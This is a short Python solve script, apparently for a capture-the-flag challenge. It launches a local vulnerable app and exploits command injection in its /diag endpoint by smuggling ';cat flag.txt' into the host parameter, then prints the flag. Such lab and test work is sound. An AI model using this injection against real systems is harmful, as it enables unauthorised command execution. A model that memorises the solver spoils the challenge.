#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18082)
    try:
        query = urllib.parse.quote("127.0.0.1;cat flag.txt")
        body = urllib.request.urlopen(f"http://127.0.0.1:18082/diag?host={query}").read().decode()
        for line in body.splitlines():
            if line.startswith("flag{"):
                print(line.strip())
                return
        raise SystemExit("flag not found")
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
